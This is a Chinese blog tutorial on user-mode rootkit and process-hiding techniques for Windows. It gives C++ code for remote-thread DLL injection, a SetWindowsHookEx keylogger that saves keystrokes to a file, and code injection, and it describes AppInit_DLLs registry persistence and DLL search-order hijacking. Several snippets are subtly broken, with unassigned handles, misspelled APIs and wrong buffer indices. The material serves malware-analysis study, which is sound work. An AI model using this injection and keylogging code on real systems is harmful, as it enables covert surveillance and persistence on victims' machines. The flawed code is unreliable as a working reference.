<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="findream's blog" type="application/atom+xml" />






<meta name="description" content="第一部分：Rootkit技术&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这">
<meta property="og:type" content="article">
<meta property="og:title" content="用户态下的Rootkit进程隐藏技术">
<meta property="og:url" content="http://yoursite.com/2018/02/07/用户态下的RootKit进程隐藏技术/index.html">
<meta property="og:site_name" content="findream&#39;s blog">
<meta property="og:description" content="第一部分：Rootkit技术&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.imgur.com/2A2LMkZ.png">
<meta property="og:image" content="https://i.imgur.com/V80hqpw.png">
<meta property="og:image" content="https://i.imgur.com/dMceeeT.png">
<meta property="og:image" content="https://i.imgur.com/9Kf0jWt.png">
<meta property="og:image" content="https://i.imgur.com/7IDTGAu.png">
<meta property="og:image" content="https://i.imgur.com/ZX9hrXY.png">
<meta property="og:image" content="https://i.imgur.com/LRBY0f0.png">
<meta property="og:image" content="https://i.imgur.com/1Seh6VN.png">
<meta property="og:image" content="https://i.imgur.com/0AQ7mt3.png">
<meta property="og:image" content="https://i.imgur.com/ee8mYv8.png">
<meta property="og:image" content="https://i.imgur.com/DKkEngR.png">
<meta property="og:image" content="https://i.imgur.com/fYLAiIV.png">
<meta property="og:image" content="https://i.imgur.com/r4Disvj.png">
<meta property="og:image" content="https://i.imgur.com/4ueB0FJ.png">
<meta property="og:image" content="https://i.imgur.com/3G4idNi.png">
<meta property="og:image" content="https://i.imgur.com/lVkDgtl.png">
<meta property="og:image" content="https://i.imgur.com/dBFrI8b.png">
<meta property="og:image" content="https://i.imgur.com/AdGNXow.png">
<meta property="og:image" content="https://i.imgur.com/P2sPZU2.png">
<meta property="og:image" content="https://i.imgur.com/bTHGlVo.png">
<meta property="og:image" content="https://i.imgur.com/O1rKkl5.png">
<meta property="og:updated_time" content="2018-03-10T14:27:09.156Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="用户态下的Rootkit进程隐藏技术">
<meta name="twitter:description" content="第一部分：Rootkit技术&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这">
<meta name="twitter:image" content="https://i.imgur.com/2A2LMkZ.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/02/07/用户态下的RootKit进程隐藏技术/"/>





  <title>用户态下的Rootkit进程隐藏技术 | findream's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">findream's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-schedule">
          <a href="/schedule/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
            
            日程表
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            公益404
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/07/用户态下的RootKit进程隐藏技术/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="findream">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="findream's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">用户态下的Rootkit进程隐藏技术</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-07T17:20:11+08:00">
                2018-02-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全/" itemprop="url" rel="index">
                    <span itemprop="name">安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="第一部分：Rootkit技术"><a href="#第一部分：Rootkit技术" class="headerlink" title="第一部分：Rootkit技术"></a>第一部分：Rootkit技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这些技术都是把恶意代码注入到进程（线程）中，一般用procexp能看到。<br><a id="more"></a></p>
<h1 id="第二部分：DLL注入"><a href="#第二部分：DLL注入" class="headerlink" title="第二部分：DLL注入"></a>第二部分：DLL注入</h1><h2 id="DLL注入的第一种方法：CreateRemoteThread远程线程调用"><a href="#DLL注入的第一种方法：CreateRemoteThread远程线程调用" class="headerlink" title="DLL注入的第一种方法：CreateRemoteThread远程线程调用"></a>DLL注入的第一种方法：CreateRemoteThread远程线程调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL注入是指向某一个特定的进程空间强制插入一个特定的DLL文件映像，值得注意的是这种插入是强制性的插入，从技术层面来看，<strong>DLL注入是利用LoadLibrary（）加载特定的DLL文件到进程的内存空间。</strong>注入的对象是可以是自身，也可以是远程进程。DLL注入技术实现主要分为5个部分，</p>
<ul>
<li><strong>第一步打开进程，获取进程的句柄，</strong></li>
<li><strong>第二歩是在内存空间开辟一段内存空间</strong></li>
<li><strong>第三步是向刚刚开辟的内存中写入需要注入DLL的路径，</strong></li>
<li><strong>第四步是利用GetProcessAddree()获取LoadLibrary的地址。</strong></li>
<li><p><strong>第五步是调用远程线程，利用LoadLibrary（）去加载DLL。</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDLLPath)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	HANDLE hProcess = <span class="literal">NULL</span>,hThread=<span class="literal">NULL</span>;</div><div class="line">	DWORD BufSize = (DWORD)(_tcslen(szDLLPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">	<span class="comment">/*-------------打开需要注入的进程-------------*/</span></div><div class="line">	<span class="keyword">if</span> (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"OpenProcess(%d) Open Fail:[%d]"</span>, dwPID, GetLastError());</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">/*------------向目标进程开辟内存空间-----------*/</span></div><div class="line">	LPVOID pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, BufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line">	<span class="comment">/*------------将目标路径写入进程---------------*/</span></div><div class="line">	WriteProcessMenory(hProcess, pRemoteBuf, (LPVOID)szDLLPath, BufSize, <span class="literal">NULL</span>);</div><div class="line">	<span class="comment">/*-----------获取LoadLibrary地址--------------*/</span></div><div class="line">	HMODULE hMod = GetModuleHandle(<span class="string">L"kenerl32.dll"</span>);</div><div class="line">	pThreadProc = GetAddress(hMod, <span class="string">"LoadLibrary"</span>);</div><div class="line">	<span class="comment">/*------------调用远程线程加载DLL--------------*/</span></div><div class="line">	hThread = CreateRemoteThread(hProcess,</div><div class="line">		<span class="literal">NULL</span>,</div><div class="line">		<span class="number">0</span>,</div><div class="line">		pThreadProc,  <span class="comment">//远程线程LaodLibrary</span></div><div class="line">		pRemoteBuf,   <span class="comment">//参数，DLL的路径</span></div><div class="line">		<span class="number">0</span>,</div><div class="line">		<span class="literal">NULL</span>);</div><div class="line">	CloseHandle(hProcess);</div><div class="line">	CloseHandle(hThread);</div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>反编译如下：</p>
<ul>
<li>打开进程<br><img src="https://i.imgur.com/2A2LMkZ.png" alt=""></li>
<li>设置进程内存空间<br><img src="https://i.imgur.com/V80hqpw.png" alt=""></li>
<li>调用CreateRemoteThread实现注入<br><img src="https://i.imgur.com/dMceeeT.png" alt=""></li>
</ul>
</li>
</ul>
<h2 id="DLL注入的第二种方法：利用注册表注入"><a href="#DLL注入的第二种方法：利用注册表注入" class="headerlink" title="DLL注入的第二种方法：利用注册表注入"></a>DLL注入的第二种方法：利用注册表注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用APPiNIT_dll注册表来实现DLL注入。因为windows允许只要加载了USER32.dll的进程并且，某一个dll的绝对路径处于注册表<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Windows\AppInit_DLLs</strong>中，os就会自动去加载位于该注册表的有效的DLL。所以只需要在注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Windows\AppInit_DLLs中添加DLL的绝对路径，并把数值改为1，可以使得所有加载USER32.dll的进程全部加载目标路径的DLL。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用AppCertDlls注册表，将<strong>HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls</strong>下写入dll的路径，可以将此注册表项下的DLL加载到调用CreateProcess，CreateProcessAsUser，CreateProcessWithLogonW，CreateProcessWithTokenW和WinExec的每个进程中。<strong>值得注意的是win xp-win 10 默认不存在这个注册表项</strong></p>
<h2 id="DLL注入的第三种方法：SetWindowsHookEx-设置钩子"><a href="#DLL注入的第三种方法：SetWindowsHookEx-设置钩子" class="headerlink" title="DLL注入的第三种方法：SetWindowsHookEx()设置钩子"></a>DLL注入的第三种方法：SetWindowsHookEx()设置钩子</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用windows的消息机制，可以在事件发送到os之间设置一条钩链，来钩取不同的消息，如以下代码，利用SetwindowsHookEx可以钩取一个键盘消息。并且调用钩子处理函数来处理这个消息，所达到的效果和dll注入是一样的（执行dll内部的代码）<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	g_hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, GetModuleHandle(TEXT(<span class="string">"消息钩取(DLL注入）实验.dll"</span>)), <span class="number">0</span>);</div><div class="line">	<span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>)</div><div class="line">		MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"安装钩子失败"</span>), TEXT(<span class="string">"提示"</span>), MB_OKCANCEL);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;钩子函数要使用回调函数，这样可以重复钩取消息<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK HookProc(int ncode, WPARAM wParam, LPARAM lParam)</div><div class="line">&#123;</div><div class="line">	FILE *fp;   <span class="comment">//做文件的写入工作</span></div><div class="line">	TCHAR <span class="type">key</span>[<span class="number">20</span>];			</div><div class="line">	const TCHAR *k = NULL;</div><div class="line">	TCHAR *p = NULL;</div><div class="line">	if (ncode &gt;= <span class="number">0</span>)  <span class="comment">//ncode 大于等于0，操作有效</span></div><div class="line">	&#123;</div><div class="line">		if (!(lParam &amp; <span class="number">0x80000000</span>))<span class="comment">//出现按键消息</span></div><div class="line">		&#123;</div><div class="line">			GetKeyNameText(lParam,<span class="type">key</span>,<span class="number">20</span>);<span class="comment">//检索键名的字符串</span></div><div class="line">			int <span class="section">state</span> = GetKeyState(VK_CAPITAL);<span class="comment">//指定大小写的状态，返回值是1或者0</span></div><div class="line">			int asyncState = GetAsyncKeyState(VK_SHIFT);<span class="comment">//指定函数调用时候</span></div><div class="line">			if (lstrlen(<span class="type">key</span>) == <span class="number">1</span>)  <span class="comment">//只出现一个按键</span></div><div class="line">			&#123;</div><div class="line">				if (asyncState &lt; <span class="number">0</span>)  <span class="comment">//未上档</span></div><div class="line">				&#123;</div><div class="line">					for (int i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++)</div><div class="line">					&#123;</div><div class="line">						if (KeyUn[i] == <span class="type">key</span>[<span class="number">0</span>])</div><div class="line">						&#123;</div><div class="line">							<span class="type">key</span>[<span class="number">0</span>] = KeyUn[i];</div><div class="line">							break;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">					if (k == NULL&amp;&amp;<span class="section">state</span> &gt; <span class="number">0</span>)  <span class="comment">//小写状态</span></div><div class="line">					&#123;</div><div class="line">						if (wParam &gt;= <span class="number">65</span> &amp;&amp; wParam &lt;= <span class="number">90</span>)</div><div class="line">							<span class="type">key</span>[<span class="number">0</span>] += <span class="number">32</span>;   <span class="comment">//转化为ASCII小写</span></div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				else  <span class="comment">//小写状态</span></div><div class="line">				&#123;</div><div class="line">					if (k == NULL&amp;&amp;<span class="section">state</span> == <span class="number">0</span>)</div><div class="line">					&#123;</div><div class="line">						if (wParam &gt;= <span class="number">65</span> &amp;&amp; wParam &lt;= <span class="number">90</span>)</div><div class="line">							<span class="type">key</span>[<span class="number">0</span>] += <span class="number">32</span>;   <span class="comment">//转化为小写</span></div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				k = &amp;<span class="type">key</span>[<span class="number">0</span>];         <span class="comment">//k指向缓冲区的地址</span></div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		else if (lstrlen(<span class="type">key</span>) == <span class="number">5</span>)</div><div class="line">		&#123;</div><div class="line">			if (<span class="type">key</span>[<span class="number">0</span>] == TEXT('N') &amp;&amp; <span class="type">key</span>[<span class="number">1</span>] == TEXT('u') &amp;&amp; <span class="type">key</span>[<span class="number">2</span>] == TEXT('m') &amp;&amp; <span class="type">key</span>[<span class="number">3</span>] == TEXT(' '))</div><div class="line">				k = &amp;<span class="type">key</span>[<span class="number">4</span>];</div><div class="line">		&#125;</div><div class="line">		if (k != NULL)</div><div class="line">		&#123;</div><div class="line">			lstrcat(str,k);</div><div class="line">			<span class="comment">//FlushBuffer();</span></div><div class="line">			<span class="comment">/*HANDLE hf = CreateFile(TEXT("C:/数据.txt"), GENERIC_READ | GENERIC_WRITE,</span></div><div class="line"><span class="comment">				0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);    </span></div><div class="line"><span class="comment">			if (!GetProcessId(NULL))</span></div><div class="line"><span class="comment">				ErrorExit(TEXT("GetProcessId"));</span></div><div class="line"><span class="comment">			DWORD written;</span></div><div class="line"><span class="comment">			WriteFile(hf, str, sizeof(str), &amp;written, 0);</span></div><div class="line"><span class="comment">			CloseHandle(hf);*/</span></div><div class="line">			fp = fopen(<span class="string">"E:/学习/C语言/Viusal Studio/消息钩取（DLL注入）实验--注入工具（GUI）/消息钩取（DLL注入）实验--注入工具（GUI）/抓取的数据.txt"</span>, <span class="string">"wt"</span>);</div><div class="line">			<span class="comment">//fprintf(fp, "%s", str);</span></div><div class="line">			<span class="comment">//fwrite(str,sizeof(str),1,fp)</span></div><div class="line">			if(fwrite(str, sizeof(str), <span class="number">1</span>, fp)!=<span class="number">1</span>)</div><div class="line">				MessageBox(NULL, TEXT(<span class="string">"文件写入失败"</span>), TEXT(<span class="string">"提示"</span>), MB_OKCANCEL);</div><div class="line">			fclose(fp);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//如果没有找到notepad的进程，将消息传递给下一个钩子</span></div><div class="line">	return CallNextHookEx(g_hHook, ncode, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）-Dll-Search-Order-Hijacking"><a href="#Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）-Dll-Search-Order-Hijacking" class="headerlink" title="Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）[Dll Search Order Hijacking]"></a>Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）[Dll Search Order Hijacking]</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dll搜索劫持技术是一种简单的dll注入技术，他利用windows加载dll目录的优先级来加载dll。他不需要通过修改注册表或者修改二进制文件的前提下注入dll的。下面是windows加载dll的默认搜索顺序：</p>
<ul>
<li>1.加载应用程序的目录</li>
<li>2.当前目录【经常利用到】</li>
<li>3.系统目录（../windows/system32）</li>
<li>4.16位子系统目录（../windows/system）</li>
<li>5.windows目录（../windows）</li>
<li>6.PATH环境变量列举的目录</li>
<li>说明：为了安全和加载速度，windows会在HKML\System\CurrentSet\SessionManger\SafeDll\SafeDllSearchMode下创建键值，系统会优先加载这些已知的dll(第一位)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在通过两个方面来进行劫持：</li>
<li>1.通过在上述注册表中添加恶意dll路径的键值，这样使得恶意dll优先注入到进程空间（这个恶意dll需要和系统dll同名）</li>
<li>2.在加载系统dll之前加载，<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有权访问文件系统的攻击者可能会将恶意ntshrui.dll放在C：\ Windows目录中。该DLL通常驻留在System32文件夹中。进程explorer.exe也驻留在c:\Windows中，一旦尝试从System32文件夹中加载ntshrui.dll，实际上会由于优先搜索顺序而加载由攻击者提供的DLL。由于攻击者已将其恶意ntshrui.dll放入与加载explorer.exe进程相同的目录中，因此将首先找到攻击者提供的DLL，从而加载代替合法DLL。由于explorer.exe在引导周期内被加载，攻击者的恶意软件被保证执行。【不上书上说的../windows比系统目录优先搜索，而是当前目录比系统目录被优先搜索】<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果启用windows的Dll的安全检查，情况可能会大有改观。<br>启用”安全DLL查找模式”时，查找顺序如下：</li>
<li>1.应用程序所在目录；</li>
<li>2.系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；</li>
<li>3.16位系统目录</li>
<li>4.Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；</li>
<li>5.当前目录。GetCurrentDirectory返回的目录；</li>
<li>6.环境变量PATH中所有目录。</li>
</ul>
<h1 id="第三部分：代码注入"><a href="#第三部分：代码注入" class="headerlink" title="第三部分：代码注入"></a>第三部分：代码注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码注入是一种向进程中插入一段独立运行的代码并且不会影响进程的运行（如崩溃）的技术，从技术上讲他也是调用CreateRemoteThread（）来注入远程代码。分两次向进程中注入，第一次以远程线程的形式注入，第二次以线程参数的形式注入远程进程。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">DWORD WINAPI ThreadProc()</div><div class="line">&#123;</div><div class="line">	<span class="comment">//需要注入的代码</span></div><div class="line">&#125;</div><div class="line">BOOL InjectCode(DWORD pId)</div><div class="line">&#123;</div><div class="line">	PHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">FALSE</span>, dwPID));</div><div class="line">	dwsize = sizeof(THREADPARAM);   <span class="comment">//插入代码所需要数据的大小</span></div><div class="line">	pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx();   <span class="comment">//在进程空间开辟一个数据大小相同的空间</span></div><div class="line">	WriteProcessMenory(hProcess, pRemoteBuf[<span class="number">0</span>], &amp;param, dwsize, NULL);<span class="comment">//将注入代码所需要的数据写入进程空间</span></div><div class="line">	dwsize = (dword)InjectCode() - (dword)ThreadProc();<span class="comment">//插入代码需要的空间大小</span></div><div class="line">	pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx();    <span class="comment">//在进程中开辟等大小的空间用于存储代码</span></div><div class="line">	WriteProcessMenory(hProcess, pRemoteBuf[<span class="number">0</span>], (LPVOID)ThreadProc(), dwsize, NULL);</div><div class="line">	hTread = CreateRemoteThread(hProcess, </div><div class="line">		                        NULL,</div><div class="line">		                        <span class="number">0</span>,</div><div class="line">		                        pRemoteBuf[<span class="number">1</span>], <span class="comment">//注入的代码</span></div><div class="line">		                        pRemoteBuf[<span class="number">0</span>], <span class="comment">//代码所需要的数据作为代码的参数传入</span></div><div class="line">		                        <span class="number">0</span>, NULL);</div><div class="line">	CloseHandle(hProcess);</div><div class="line">	CloseHandle(hThread);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>反编译如下：<ul>
<li>复制代码所需数据<br><img src="https://i.imgur.com/9Kf0jWt.png" alt=""></li>
<li>打开目标进程：<br><img src="https://i.imgur.com/7IDTGAu.png" alt=""></li>
<li>开辟内存空间，为了存储数据<br><img src="https://i.imgur.com/ZX9hrXY.png" alt=""></li>
<li>写入数据<br><img src="https://i.imgur.com/LRBY0f0.png" alt=""></li>
<li>开辟进程空间，为了存储代码<br><img src="https://i.imgur.com/1Seh6VN.png" alt=""></li>
<li>写入代码<br><img src="https://i.imgur.com/0AQ7mt3.png" alt=""></li>
<li>调用CreateRemoteThread()进行代码注入<br><img src="https://i.imgur.com/ee8mYv8.png" alt=""></li>
</ul>
</li>
</ul>
<h1 id="第四部分：HOOK技术"><a href="#第四部分：HOOK技术" class="headerlink" title="第四部分：HOOK技术"></a>第四部分：HOOK技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HOOK叫做钩取(钩子)，他的原理是：windows系统分为用户态和内核态，在用户态中需要访问一些敏感的数据（网络，文件资源等）就必须要调用windowsAPI函数，来与kernel沟通获得该资源的使用权。钩子便可以这是在调用API函数的时候，在调用之前（IAT_HOOK）或者之后发挥作用，这样恶意软件便不需要创建一个进程就可以实现某些恶意的功能。便达到了隐藏自身的作用。</p>
